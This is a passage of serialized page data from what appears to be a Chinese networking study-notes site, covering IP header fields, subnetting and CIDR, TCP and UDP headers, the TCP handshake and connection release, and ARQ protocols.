Live)，表明数据报在网络中的寿命。表示为数据报在网络中可通过的路由器数的最大值。\n\n> 用于防止数据报的目的地址是无效的，而在网络中无限转发，每转发一次生存时间减1\n\n协议：占8 位，指出此数据报携带的数据使用何种协议，以便目的主机的 IP 层将数据部分上交给哪个处理过程。\n\n> 可能是tcp也可能是udp，也有可能是ip路由协议\n\n首部检验和：占16 位，只检验数据报的首部，不检验数据部分\n\n> 数据部分由运输层来校验错误\n\n\n# 可变部分\n\n可选字段：长度可变，从 1 个字节到 40 个字节不等，取决于所选择的项目，用来支持排错、测量以及安全等措施。实际上很少被使用。",normalizedContent:"一个 ip 数据报由首部和数据两部分组成。\n\n\n\n首部分为固定部分和可变部分，固定部分长度为20个字节，可变部分长度是可变的。\n\n\n\n\n# 固定部分\n\n版本ip协议版本：ipv4和ipv6\n\n * 首部长度：占 4 位，可表示的最大数值是 15 （ $2^4 - 1$）个单位(一个单位为 4 字节)。因此 ip 的首部长度的最大值是 60 字节(15*4)。\n\n * 区分服务：占 8 位，只有在使用区分服务（diffserv）时，这个字段才起作用。在一般的情况下都不使用这个字段。\n\n * 总长度：占 16 位，这个字段的内容表示首部和数据之和的长度，单位为字节，因此数据报的最大长度为 65535 字节。\n\n进行数据报的分片的原因\n\n 1. ip数据报的总长度必须不超过数据链路层最大传送单元 mtu。\n 2. 若所传送的数据报的长度超过数据链路层的mtu值， 就必须把过长的数据报进行分片处理。\n\n标识：占 16 位，它是一个计数器，用来产生 ip 数据报的标识。\n\n> 有同样标识的ip数据报属于同一个未分片的ip数据报\n\n标志(flag)：占 3 位，目前只有前两位有意义。\n\n> 标志字段的最低位是 mf (more fragment)。mf = 1 表示后面“还有分片”。 mf = 0 表示最后一个分片。\n> \n> 标志字段中间的一位是 df (don‘t fragment) 。 df = 1 表示不允许分片。 mf = 0 表示允许分片。\n\n片偏移：占13 位，指出：较长的分组在分片后某片在原分组中的相对位置。片偏移以 8 个字节为偏移单位。\n\n\n\n\n\n生存时间——占8 位，记为 ttl (time to live)，表明数据报在网络中的寿命。表示为数据报在网络中可通过的路由器数的最大值。\n\n> 用于防止数据报的目的地址是无效的，而在网络中无限转发，每转发一次生存时间减1\n\n协议：占8 位，指出此数据报携带的数据使用何种协议，以便目的主机的 ip 层将数据部分上交给哪个处理过程。\n\n> 可能是tcp也可能是udp，也有可能是ip路由协议\n\n首部检验和：占16 位，只检验数据报的首部，不检验数据部分\n\n> 数据部分由运输层来校验错误\n\n\n# 可变部分\n\n可选字段：长度可变，从 1 个字节到 40 个字节不等，取决于所选择的项目，用来支持排错、测量以及安全等措施。实际上很少被使用。",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"划分子网",frontmatter:{title:"划分子网",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/e2c6cc/",categories:["网络","网络原理","网络层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/03.%E7%BD%91%E7%BB%9C%E5%B1%82/10.%E5%88%92%E5%88%86%E5%AD%90%E7%BD%91.html",relativePath:"06.网络/02.网络原理/03.网络层/10.划分子网.md",key:"v-10477bc0",path:"/pages/e2c6cc/",headersStr:null,content:"在 IP 地址中又增加了一个“子网号字段”，使两级的IP 地址变成为三级的 IP 地址。\n\n\n\n\n\n\n# 子网掩码\n\n32位， 由一串1和0组成， 其中1对应原IP地址中的网络号加子网号， 0对应于主机号。\n\n\n\n默认的子网掩码\n\n\n\n(IP 地址) AND (子网掩码) =网络地址\n\n\n\n\n# 无分类编址\n\n无分类域间路由选择 CIDR (Classless Inter-Domain Routing)。\n\nCIDR 消除了传统的 A 类、 B 类和 C 类地址以及划分子网的概念， 因而可以更加有效地分配 IPv4 的地址空间。\n\nCIDR使用各种长度的“网络前缀”(network-prefix)来代替分类地址中的网络号和子网号。 构建超网\n\n\n# 表示法\n\n 1. 斜线记法（ CIDR记法）\n    \n    例如： 128.14.35.7/20\n\n 2. 地址掩码\n    \n    例如： /20地址块的地址掩码表示为： 255.255.240.0",normalizedContent:"在 ip 地址中又增加了一个“子网号字段”，使两级的ip 地址变成为三级的 ip 地址。\n\n\n\n\n\n\n# 子网掩码\n\n32位， 由一串1和0组成， 其中1对应原ip地址中的网络号加子网号， 0对应于主机号。\n\n\n\n默认的子网掩码\n\n\n\n(ip 地址) and (子网掩码) =网络地址\n\n\n\n\n# 无分类编址\n\n无分类域间路由选择 cidr (classless inter-domain routing)。\n\ncidr 消除了传统的 a 类、 b 类和 c 类地址以及划分子网的概念， 因而可以更加有效地分配 ipv4 的地址空间。\n\ncidr使用各种长度的“网络前缀”(network-prefix)来代替分类地址中的网络号和子网号。 构建超网\n\n\n# 表示法\n\n 1. 斜线记法（ cidr记法）\n    \n    例如： 128.14.35.7/20\n\n 2. 地址掩码\n    \n    例如： /20地址块的地址掩码表示为： 255.255.240.0",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"构建超网",frontmatter:{title:"构建超网",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/13d20f/",categories:["网络","网络原理","网络层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/03.%E7%BD%91%E7%BB%9C%E5%B1%82/11.%E6%9E%84%E5%BB%BA%E8%B6%85%E7%BD%91.html",relativePath:"06.网络/02.网络原理/03.网络层/11.构建超网.md",key:"v-0be0ee64",path:"/pages/13d20f/",headers:[{level:5,title:"路由聚合",slug:"路由聚合",normalizedTitle:"路由聚合",charIndex:2}],headersStr:"路由聚合",content:"# 路由聚合\n\n网络前缀都相同的连续的IP地址组成“CIDR地址块”。\n\n\n\n一个 CIDR 地址块可以包含很多地址， 在路由表中就利用CIDR地址块来查找目的网络， 因此这种地址的聚合称为路由聚合。路由聚合也称为构成超网。",normalizedContent:"# 路由聚合\n\n网络前缀都相同的连续的ip地址组成“cidr地址块”。\n\n\n\n一个 cidr 地址块可以包含很多地址， 在路由表中就利用cidr地址块来查找目的网络， 因此这种地址的聚合称为路由聚合。路由聚合也称为构成超网。",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"TCP",frontmatter:{title:"TCP",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/16b1e4/",categories:["网络","网络原理","传输层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/04.%E4%BC%A0%E8%BE%93%E5%B1%82/02.TCP.html",relativePath:"06.网络/02.网络原理/04.传输层/02.TCP.md",key:"v-478deb56",path:"/pages/16b1e4/",headers:[{level:2,title:"固定首部",slug:"固定首部",normalizedTitle:"固定首部",charIndex:10},{level:2,title:"可变首部",slug:"可变首部",normalizedTitle:"可变首部",charIndex:15},{level:2,title:"理想的传输条件",slug:"理想的传输条件",normalizedTitle:"理想的传输条件",charIndex:1140},{level:2,title:"停止等待协议",slug:"停止等待协议",normalizedTitle:"停止等待协议",charIndex:1293},{level:2,title:"连续ARQ协议",slug:"连续arq协议",normalizedTitle:"连续arq协议",charIndex:1316},{level:2,title:"建立连接之前",slug:"建立连接之前",normalizedTitle:"建立连接之前",charIndex:1413},{level:2,title:"建立连接",slug:"建立连接",normalizedTitle:"建立连接",charIndex:1413},{level:2,title:"释放连接",slug:"释放连接",normalizedTitle:"释放连接",charIndex:657}],headersStr:"固定首部 可变首部 理想的传输条件 停止等待协议 连续ARQ协议 建立连接之前 建立连接 释放连接",content:"# 首部格式\n\n分为固定首部和可变首部\n\n\n\n\n# 固定首部\n\n序号字段：占 4 字节，序号字段的值则指的是本报文段所发送的数据的第一个字节的序号\n\n确认号字段：占 4 字节，是期望收到对方的下一个报文段的数据的第一个字节的序号。\n\n> 例： B正确收到A发送过来的一个报文段，其序号字段值是501，而数据长度是200字节（序号501-700）。这表明B正确收到了A发送的到序号700为止的数据。因此， B期望收到A的下一个数据序号是701。\n> \n> 若确认号=N，则表明：到序号N-1为止的所有数据都已正确收到。\n\n数据偏移（即首部长度）：占 4 位，它指出 TCP 报文段的数据起始处距离 TCP 报文段的起始处有多远。“数据偏移”的单位是 32 位字（以 4 字节为计算单位,4*8=32）。\n\n保留字段：占 6 位，保留为今后使用，但目前应置为 0。\n\n紧急 URG：当 URG = 1 时，表明紧急指针字段有效。它告诉系统此报文段中有紧急数据，应尽快传送(相当于高优先级的数据)。\n\n> urgent紧急\n\n确认 ACK：只有当 ACK = 1 时确认号字段才有效。当 ACK = 0时，确认号无效\n\n> acknowledge承认\n\n推送 PSH (PuSH)：接收 TCP 收到 PSH = 1 的报文段，就尽快地交付接收应用进程，而不再等到整个缓存都填满了后再向上交付。\n\n复位 RST (ReSeT) ：当 RST = 1 时，表明 TCP 连接中出现严重差错（如由于主机崩溃或其他原因），必须释放连接，然后再重新建立运输连接\n\n同步 SYN：同步 SYN = 1 表示这是一个连接请求或连接接受报文\n\n> synchronized同步的\n\n终止 FIN (FINis)：用来释放一个连接。 FIN = 1 表明此报文段的发送端的数据已发送完毕，并要求释放运输连接。\n\n窗口字段：占 2 字节，用来让对方设置发送窗口的依据，单位为字节。\n\n> 例： A发送给B的报文段中，确认号是701，窗口字段是1000。 表明从701号算起，发送此报文段的A还有接收1000个字节数据的接收缓存空间。 即 告诉B可以发送1000个字节。\n\n检验和:占 2 字节。 检验和字段计算方法同UDP。\n\n紧急指针字段：占 16 位， 指出在本报文段中紧急数据共有多少个字节（紧急数据放在本报文段数据的最前面） 。\n\n\n# 可变首部\n\n选项字段：长度可变。 TCP 最初只规定了一种选项， 即最大报文段长度 MSS。 MSS 是 TCP 报文段中的数据字段的最大长度。\n\n填充字段 ：这是为了使整个首部长度是 4 字节的整数倍。\n\n> 凑数用的\n\n\n# 可靠传输的工作原理\n\n\n# 理想的传输条件\n\n 1. 传输信道不产生差错。\n\n 2. 不管发送方以多快的速度发送数据，接收方总是来得及处理收 到的数据。\n\n> 在这样的理想传输条件下，不需要采取任何措施就能够实现可靠传输。然而实际的网络都不具备以上两个理想条件。 必须使用一些可靠传输协议， 在不可靠的传输信道实现可靠传输。\n\n\n# 停止等待协议\n\nTCP：停止等待协议\n\n\n# 连续ARQ协议\n\nTCP:连续ARQ协议\n\n\n# 拥塞控制\n\nTCP: 拥塞控制\n\n\n# 连接管理\n\nTCP运输连接分为三个阶段\n\n 1. 连接建立\n 2. 数据传送\n 3. 连接释放\n\n\n# 建立连接之前\n\n * TCP连接的建立采用 客户/服务器 的方式\n   \n   * 主动发起连接建立请求的应用进程叫做客户（Client）\n   * 被动等待连接建立的应用进程叫做服务器（Server）\n\n * 客户、服务器都能确知对方的存在\n\n * 要允许双方协商一些参数：\n   \n   * 最大窗口值、时间戳、服务质量等\n\n * 要能对运输实体资源进行分配：\n   \n   * 缓存大小、连接表中的项目等\n\n\n\n服务器要提前创建传输控制块TCB ，并进入监听状态\n\n> TCB存储连接中所需的TCP连接请求表、窗口值、序号、时间戳等重要信息。\n\n客户端确定要访问的地址，也创建传输控制块TCB，准备发起网络访问\n\n\n# 建立连接\n\n三次握手 TCP：连接的建立，三次握手\n\n\n# 释放连接\n\n四次挥手 TCP:连接的释放 四次挥手",normalizedContent:"# 首部格式\n\n分为固定首部和可变首部\n\n\n\n\n# 固定首部\n\n序号字段：占 4 字节，序号字段的值则指的是本报文段所发送的数据的第一个字节的序号\n\n确认号字段：占 4 字节，是期望收到对方的下一个报文段的数据的第一个字节的序号。\n\n> 例： b正确收到a发送过来的一个报文段，其序号字段值是501，而数据长度是200字节（序号501-700）。这表明b正确收到了a发送的到序号700为止的数据。因此， b期望收到a的下一个数据序号是701。\n> \n> 若确认号=n，则表明：到序号n-1为止的所有数据都已正确收到。\n\n数据偏移（即首部长度）：占 4 位，它指出 tcp 报文段的数据起始处距离 tcp 报文段的起始处有多远。“数据偏移”的单位是 32 位字（以 4 字节为计算单位,4*8=32）。\n\n保留字段：占 6 位，保留为今后使用，但目前应置为 0。\n\n紧急 urg：当 urg = 1 时，表明紧急指针字段有效。它告诉系统此报文段中有紧急数据，应尽快传送(相当于高优先级的数据)。\n\n> urgent紧急\n\n确认 ack：只有当 ack = 1 时确认号字段才有效。当 ack = 0时，确认号无效\n\n> acknowledge承认\n\n推送 psh (push)：接收 tcp 收到 psh = 1 的报文段，就尽快地交付接收应用进程，而不再等到整个缓存都填满了后再向上交付。\n\n复位 rst (reset) ：当 rst = 1 时，表明 tcp 连接中出现严重差错（如由于主机崩溃或其他原因），必须释放连接，然后再重新建立运输连接\n\n同步 syn：同步 syn = 1 表示这是一个连接请求或连接接受报文\n\n> synchronized同步的\n\n终止 fin (finis)：用来释放一个连接。 fin = 1 表明此报文段的发送端的数据已发送完毕，并要求释放运输连接。\n\n窗口字段：占 2 字节，用来让对方设置发送窗口的依据，单位为字节。\n\n> 例： a发送给b的报文段中，确认号是701，窗口字段是1000。 表明从701号算起，发送此报文段的a还有接收1000个字节数据的接收缓存空间。 即 告诉b可以发送1000个字节。\n\n检验和:占 2 字节。 检验和字段计算方法同udp。\n\n紧急指针字段：占 16 位， 指出在本报文段中紧急数据共有多少个字节（紧急数据放在本报文段数据的最前面） 。\n\n\n# 可变首部\n\n选项字段：长度可变。 tcp 最初只规定了一种选项， 即最大报文段长度 mss。 mss 是 tcp 报文段中的数据字段的最大长度。\n\n填充字段 ：这是为了使整个首部长度是 4 字节的整数倍。\n\n> 凑数用的\n\n\n# 可靠传输的工作原理\n\n\n# 理想的传输条件\n\n 1. 传输信道不产生差错。\n\n 2. 不管发送方以多快的速度发送数据，接收方总是来得及处理收 到的数据。\n\n> 在这样的理想传输条件下，不需要采取任何措施就能够实现可靠传输。然而实际的网络都不具备以上两个理想条件。 必须使用一些可靠传输协议， 在不可靠的传输信道实现可靠传输。\n\n\n# 停止等待协议\n\ntcp：停止等待协议\n\n\n# 连续arq协议\n\ntcp:连续arq协议\n\n\n# 拥塞控制\n\ntcp: 拥塞控制\n\n\n# 连接管理\n\ntcp运输连接分为三个阶段\n\n 1. 连接建立\n 2. 数据传送\n 3. 连接释放\n\n\n# 建立连接之前\n\n * tcp连接的建立采用 客户/服务器 的方式\n   \n   * 主动发起连接建立请求的应用进程叫做客户（client）\n   * 被动等待连接建立的应用进程叫做服务器（server）\n\n * 客户、服务器都能确知对方的存在\n\n * 要允许双方协商一些参数：\n   \n   * 最大窗口值、时间戳、服务质量等\n\n * 要能对运输实体资源进行分配：\n   \n   * 缓存大小、连接表中的项目等\n\n\n\n服务器要提前创建传输控制块tcb ，并进入监听状态\n\n> tcb存储连接中所需的tcp连接请求表、窗口值、序号、时间戳等重要信息。\n\n客户端确定要访问的地址，也创建传输控制块tcb，准备发起网络访问\n\n\n# 建立连接\n\n三次握手 tcp：连接的建立，三次握手\n\n\n# 释放连接\n\n四次挥手 tcp:连接的释放 四次挥手",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"基本概念",frontmatter:{title:"基本概念",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/e86a28/",categories:["网络","网络原理","传输层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/04.%E4%BC%A0%E8%BE%93%E5%B1%82/01.%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.html",relativePath:"06.网络/02.网络原理/04.传输层/01.基本概念.md",key:"v-16f089cc",path:"/pages/e86a28/",headers:[{level:2,title:"两类端口",slug:"两类端口",normalizedTitle:"两类端口",charIndex:255}],headersStr:"两类端口",content:"运输层面向应用提供通信服务，通过端口来区分不同的应用\n\n只有在主机中才会使用到运输层，而在路由器中最高使用的是网络层\n\n> 运输层的数据在包装在网络层的数据报里面，但是网络层不会对该数据进行访问\n\n\n\n运输层协议和网络层协议的主要区别\n\n\n\n\n# 运输层的端口\n\n * 进程标识符标志运行在计算机中的进程。\n\n * 在运输层使用协议端口号(或简称为端口)标志TCP/IP体系的应用进程，实现运行不同操作系统的计算机的应用进程的互相通信。\n\n * TCP/IP的运输层的端口用一个16位端口号进行标志。\n\n\n# 两类端口\n\n 1. 服务端使用的端口号\n    \n    1. 熟知端口号或系统端口号，熟知为0-1023\n    2. 登记端口号，数值为1024-49151, 为没有熟知端口号的应用程序使用的。使用这个范围的端口号必须在IANA登记，以防止重复。\n\n 2. 客户端口号或短暂端口号\n    \n    数值为49152-65535，留给客户进程选择暂时使用。\n\n\n# TCP\n\nTCP\n\n\n# UDP\n\nUDP",normalizedContent:"运输层面向应用提供通信服务，通过端口来区分不同的应用\n\n只有在主机中才会使用到运输层，而在路由器中最高使用的是网络层\n\n> 运输层的数据在包装在网络层的数据报里面，但是网络层不会对该数据进行访问\n\n\n\n运输层协议和网络层协议的主要区别\n\n\n\n\n# 运输层的端口\n\n * 进程标识符标志运行在计算机中的进程。\n\n * 在运输层使用协议端口号(或简称为端口)标志tcp/ip体系的应用进程，实现运行不同操作系统的计算机的应用进程的互相通信。\n\n * tcp/ip的运输层的端口用一个16位端口号进行标志。\n\n\n# 两类端口\n\n 1. 服务端使用的端口号\n    \n    1. 熟知端口号或系统端口号，熟知为0-1023\n    2. 登记端口号，数值为1024-49151, 为没有熟知端口号的应用程序使用的。使用这个范围的端口号必须在iana登记，以防止重复。\n\n 2. 客户端口号或短暂端口号\n    \n    数值为49152-65535，留给客户进程选择暂时使用。\n\n\n# tcp\n\ntcp\n\n\n# udp\n\nudp",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"UDP",frontmatter:{title:"UDP",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/fbe261/",categories:["网络","网络原理","传输层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/04.%E4%BC%A0%E8%BE%93%E5%B1%82/03.UDP.html",relativePath:"06.网络/02.网络原理/04.传输层/03.UDP.md",key:"v-3025a975",path:"/pages/fbe261/",headersStr:null,content:"用户数据报协议\n\n\n# 特点\n\n 1. UDP 只在 IP 的数据报服务之上增加了很少一点的功能：\n    \n    1. 复用和分用的功能\n    2. 差错检测的功能\n\n 2. UDP 是无连接的\n\n 3. UDP 使用尽最大努力交付，即不保证可靠交付。\n\n 4. UDP 没有拥塞控制，很适合多媒体通信的要求。\n\n 5. UDP 支持一对一、一对多、多对一和多对多的交互通信。\n\n 6. UDP 的首部开销小，只有 8 个字节。\n\n 7. UDP 是面向报文的。\n    \n    UDP 对应用层交下来的报文，既不合并，也不拆分，而是保留这些报文的边界\n\n\n# 首部格式\n\n\n\n长度：UDP用户数据报的长度，最小值是8，代表可以没有数据\n\n检验和：整个用户数据报的检验和，会加入伪首部进行检验",normalizedContent:"用户数据报协议\n\n\n# 特点\n\n 1. udp 只在 ip 的数据报服务之上增加了很少一点的功能：\n    \n    1. 复用和分用的功能\n    2. 差错检测的功能\n\n 2. udp 是无连接的\n\n 3. udp 使用尽最大努力交付，即不保证可靠交付。\n\n 4. udp 没有拥塞控制，很适合多媒体通信的要求。\n\n 5. udp 支持一对一、一对多、多对一和多对多的交互通信。\n\n 6. udp 的首部开销小，只有 8 个字节。\n\n 7. udp 是面向报文的。\n    \n    udp 对应用层交下来的报文，既不合并，也不拆分，而是保留这些报文的边界\n\n\n# 首部格式\n\n\n\n长度：udp用户数据报的长度，最小值是8，代表可以没有数据\n\n检验和：整个用户数据报的检验和，会加入伪首部进行检验",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"TCP：连接的建立，三次握手",frontmatter:{title:"TCP：连接的建立，三次握手",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/d0c978/",categories:["网络","网络原理","传输层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/04.%E4%BC%A0%E8%BE%93%E5%B1%82/05.TCP%EF%BC%9A%E8%BF%9E%E6%8E%A5%E7%9A%84%E5%BB%BA%E7%AB%8B%EF%BC%8C%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B.html",relativePath:"06.网络/02.网络原理/04.传输层/05.TCP：连接的建立，三次握手.md",key:"v-3c96bce2",path:"/pages/d0c978/",headersStr:null,content:"# 第一次握手\n\n客户端向服务器发送连接请求报文段\n\n\n\n> A 向 B 发出连接请求报文段\n> \n> 报文段首部：同步控制位SYN = 1，初始序号seq = x。\n\n\n# 第二次握手\n\n服务器返回对连接请求信息的确认报文段\n\n\n\n> B收到连接请求报文段后，如果同意，则发回确认信息。\n> \n> 确认报文段首部：\n> \n> 同步控制位SYN = 1 ， 确认位ACK = 1，确认号ack = x+1， 序号 seq= y 。\n\n\n# 第三次握手\n\n客户端再向服务器发送来的确认报文段进行再一次的确认， TCP连接建立完成\n\n\n\n> A 收到确认报文段后，再向 B 给出确认(对确认的确认)； 报文段首部： ACK = 1， seq = x + 1 ， ack = y + 1。\n\n\n\n\n# 两次握手存在问题\n\n\n\n如果产生了网络拥塞 TCP: 拥塞控制 ，就像图中连接请求1那样，延迟到达，然后服务器接收了请求，为这个请求申请了相关的资源，而客户因为已经建立了连接而不理睬确认信息，导致该连接一直占用资源而不能释放",normalizedContent:"# 第一次握手\n\n客户端向服务器发送连接请求报文段\n\n\n\n> a 向 b 发出连接请求报文段\n> \n> 报文段首部：同步控制位syn = 1，初始序号seq = x。\n\n\n# 第二次握手\n\n服务器返回对连接请求信息的确认报文段\n\n\n\n> b收到连接请求报文段后，如果同意，则发回确认信息。\n> \n> 确认报文段首部：\n> \n> 同步控制位syn = 1 ， 确认位ack = 1，确认号ack = x+1， 序号 seq= y 。\n\n\n# 第三次握手\n\n客户端再向服务器发送来的确认报文段进行再一次的确认， tcp连接建立完成\n\n\n\n> a 收到确认报文段后，再向 b 给出确认(对确认的确认)； 报文段首部： ack = 1， seq = x + 1 ， ack = y + 1。\n\n\n\n\n# 两次握手存在问题\n\n\n\n如果产生了网络拥塞 tcp: 拥塞控制 ，就像图中连接请求1那样，延迟到达，然后服务器接收了请求，为这个请求申请了相关的资源，而客户因为已经建立了连接而不理睬确认信息，导致该连接一直占用资源而不能释放",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"TCP_连接的释放 四次挥手",frontmatter:{title:"TCP_连接的释放 四次挥手",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/a83c1f/",categories:["网络","网络原理","传输层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/04.%E4%BC%A0%E8%BE%93%E5%B1%82/04.TCP_%E8%BF%9E%E6%8E%A5%E7%9A%84%E9%87%8A%E6%94%BE%20%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B.html",relativePath:"06.网络/02.网络原理/04.传输层/04.TCP_连接的释放 四次挥手.md",key:"v-247805e7",path:"/pages/a83c1f/",headersStr:null,content:"# 第一次挥手\n\nA向B发送FIN + ACK 报文，要求释放连接\n\n> A 向 B 发出连接释放报文段； 报文段首部：终止控制位FIN = 1，序号seq = u; u 的值为： 已经传送数据的最后一个字节的序号加1。\n\n\n# 第二次挥手\n\nB向A发送ACK 报文，表示对A的信息确认\n\n> B收到连接释放报文段后，如果同意，则发回确认信息； 从A到B方向上的连接已释放， TCP连接处于半关闭状态； 如果B还向A发送数据，则A还要接收数据； 报文段首部：确认位ACK = 1 ， 确认号ack = u+1， 序号 seq = v 。\n\n\n# 第三次握手\n\nB再向A发送FIN + ACK报文，可以关闭连接了\n\n\n\n> B向A发出连接释放报文段\n> \n> 报文段首部： ack = u+1;\n\n\n# 第四次挥手\n\nA向B发送ACK报文，确认连接释放\n\n\n\n> A 收到B发送的连接释放报文段后，向B发送确认。 经过时间2MSL， A关闭。 TCP连接释放",normalizedContent:"# 第一次挥手\n\na向b发送fin + ack 报文，要求释放连接\n\n> a 向 b 发出连接释放报文段； 报文段首部：终止控制位fin = 1，序号seq = u; u 的值为： 已经传送数据的最后一个字节的序号加1。\n\n\n# 第二次挥手\n\nb向a发送ack 报文，表示对a的信息确认\n\n> b收到连接释放报文段后，如果同意，则发回确认信息； 从a到b方向上的连接已释放， tcp连接处于半关闭状态； 如果b还向a发送数据，则a还要接收数据； 报文段首部：确认位ack = 1 ， 确认号ack = u+1， 序号 seq = v 。\n\n\n# 第三次握手\n\nb再向a发送fin + ack报文，可以关闭连接了\n\n\n\n> b向a发出连接释放报文段\n> \n> 报文段首部： ack = u+1;\n\n\n# 第四次挥手\n\na向b发送ack报文，确认连接释放\n\n\n\n> a 收到b发送的连接释放报文段后，向b发送确认。 经过时间2msl， a关闭。 tcp连接释放",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"TCP：停止等待协议",frontmatter:{title:"TCP：停止等待协议",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/b42ae6/",categories:["网络","网络原理","传输层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/04.%E4%BC%A0%E8%BE%93%E5%B1%82/06.TCP%EF%BC%9A%E5%81%9C%E6%AD%A2%E7%AD%89%E5%BE%85%E5%8D%8F%E8%AE%AE.html",relativePath:"06.网络/02.网络原理/04.传输层/06.TCP：停止等待协议.md",key:"v-71c351ec",path:"/pages/b42ae6/",headers:[{level:2,title:"信道的利用率",slug:"信道的利用率",normalizedTitle:"信道的利用率",charIndex:291}],headersStr:"信道的利用率",content:"每发送完一个分组就停止发送，等待对方的确认。在收到确认后再发送下一个分组。\n\n\n\n\n\n\n\n * 在发送完一个分组后，必须暂时保留已发送的分组的副本。\n   \n   > 为了在超时之后重传\n\n * 分组和确认分组都必须进行编号。\n\n * 超时计时器的重传时间应当比数据在分组传输的平均往返时间更长一些。\n\n * 使用上述的确认和重传机制，我们就可以在不可靠的传输网络上实现可靠的通信。\n\n * 这种可靠传输协议常称为自动重传请求ARQ(Automatic Repeat reQuest)。\n\n * ARQ 表明重传的请求是自动进行的。接收方不需要请求发送方重传某个出错的分组\n\n\n# 信道的利用率\n\n * 发送时间$T_D$\n * 往返时间RTT,\n * 接受时间$T_A$\n\n信道利用率 $U = { \\frac {T_D} {T_D+RTT+T_A}}$ ,可以看出停止等待协议的信道利用率很低\n\n",normalizedContent:"每发送完一个分组就停止发送，等待对方的确认。在收到确认后再发送下一个分组。\n\n\n\n\n\n\n\n * 在发送完一个分组后，必须暂时保留已发送的分组的副本。\n   \n   > 为了在超时之后重传\n\n * 分组和确认分组都必须进行编号。\n\n * 超时计时器的重传时间应当比数据在分组传输的平均往返时间更长一些。\n\n * 使用上述的确认和重传机制，我们就可以在不可靠的传输网络上实现可靠的通信。\n\n * 这种可靠传输协议常称为自动重传请求arq(automatic repeat request)。\n\n * arq 表明重传的请求是自动进行的。接收方不需要请求发送方重传某个出错的分组\n\n\n# 信道的利用率\n\n * 发送时间$t_d$\n * 往返时间rtt,\n * 接受时间$t_a$\n\n信道利用率 $u = { \\frac {t_d} {t_d+rtt+t_a}}$ ,可以看出停止等待协议的信道利用率很低\n\n",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"TCP_连续ARQ协议",frontmatter:{title:"TCP_连续ARQ协议",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/566027/",categories:["网络","网络原理","传输层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/04.%E4%BC%A0%E8%BE%93%E5%B1%82/07.TCP_%E8%BF%9E%E7%BB%ADARQ%E5%8D%8F%E8%AE%AE.html",relativePath:"06.网络/02.网络原理/04.传输层/07.TCP_连续ARQ协议.md",key:"v-63400f9e",path:"/pages/566027/",headersStr:null,content:"连续ARQ协议基于滑动窗口机制。\n\n发送方维持发送窗口，它的意义是：位于发送窗口内的分组都可连续发送出去，而不需要等待对方的确认。\n\n> 发送窗口中是允许发送的序号。发送窗口的大小表示的是发送方可以连续发送的分组个数。\n\n接收方使用接收窗口，表示位于接口窗口内的分组允许接收\n\n接收方一般采用累积确认的方式。即不必对收到的分组逐个发送确认，而是对按序到达的最后一个分组发送确认，这样就表示：到这个分组为止的所有分组都已正确收到了。\n\nGo-back-N（回退 N），表示需要再退回来重传已发送过的 N 个分组。\n\n> 例如：如果发送方发送了前 5 个分组，而中间的第 3 个分组丢失了。这时接收方只能对前两个分组发出确认。发送方要把后面的三个分组(3,4,5)都再重传一次。",normalizedContent:"连续arq协议基于滑动窗口机制。\n\n发送方维持发送窗口，它的意义是：位于发送窗口内的分组都可连续发送出去，而不需要等待对方的确认。\n\n> 